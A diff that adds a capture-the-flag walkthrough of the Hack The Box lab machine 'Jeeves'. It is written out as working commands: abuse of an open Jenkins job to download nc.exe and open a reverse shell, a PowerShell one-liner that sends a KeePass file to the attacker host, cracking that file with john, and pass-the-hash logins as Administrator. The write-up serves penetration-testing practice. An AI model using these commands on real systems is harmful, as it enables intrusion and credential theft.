@@ -1,0 +1,95 @@
+
+
+
+we go to port 50000
+nothing there.
+but there is an /askjeeves directory
+
+http://10.10.10.63:50000/askjeeves/
+
+contains a Jenkins server
+
+
+Freestyle project
+add Execute Windows batch Command
+
+they are executed in order, line by line
+
+
+Started by user anonymous
+Building in workspace C:\Users\Administrator\.jenkins\workspace\rvrv
+[rvrv] $ cmd /c call C:\Users\kohsuke\AppData\Local\Temp\jenkins6943472717711337229.bat
+
+C:\Users\Administrator\.jenkins\workspace\rvrv>powershell wget "http://10.10.14.16/nc.exe" -outfile "nc.exe" 
+
+C:\Users\Administrator\.jenkins\workspace\rvrv>nc.exe -e cmd.exe 10.10.14.16 1234 
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [10.10.14.16] from (UNKNOWN) [10.10.10.63] 49689
+Microsoft Windows [Version 10.0.10586]
+(c) 2015 Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator\.jenkins\workspace\rvrv>whoami
+whoami
+jeeves\kohsuke
+
+C:\Users\Administrator\.jenkins\workspace\rvrv>
+
+there is a kdbx in the Documents folder
+
+
+powershell -NoProfile -Command "$c=New-Object System.Net.Sockets.TCPClient('10.10.14.16',1235);$s=$c.GetStream();$b=Get-Content -Path 'C:\Users\kohsuke\Documents\CEH.kdbx' -Encoding Byte;$s.Write($b,0,$b.Length);$s.Close();$c.Close()"
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lp 1235 > jeeves.kdbx
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# keepass2john jeeves.kdbx > jeeves.hash
+                                              
+┌──(root㉿kali)-[/home/kali]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt --rules --format=keepass jeeves.hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (KeePass [SHA256 AES 32/64])
+Cost 1 (iteration count) is 6000 for all loaded hashes
+Cost 2 (version) is 2 for all loaded hashes
+Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
+Will run 3 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+moonshine1       (jeeves)     
+1g 0:00:00:34 DONE (2025-08-22 10:19) 0.02894g/s 1591p/s 1591c/s 1591C/s morochita..molly21
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+┌──(root㉿kali)-[/home/kali]
+└─# keepassxc jeeves.kdbx
+QStandardPaths: XDG_RUNTIME_DIR not set, defaulting to '/tmp/runtime-root'
+
+
+Admin hash Found
+copy/paste from vm stopped working
+
+pth-winexe -U "Administrator%aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>" //10.10.10.63 cmd
+
+
+
+pth-smbclient //10.10.10.63/ADMIN$ -U "Administrator%aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>" -c "dir"
+pth-rpcclient -U "Administrator%aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>" 10.10.10.63
+
+
+
+the flag is hidden behind an alternate data stream. 
+we find it with dir /R
+and cap it with
+powershell Get-Content -Path "hm.txt" -Stream root.txt
+
+
+
+
+
+
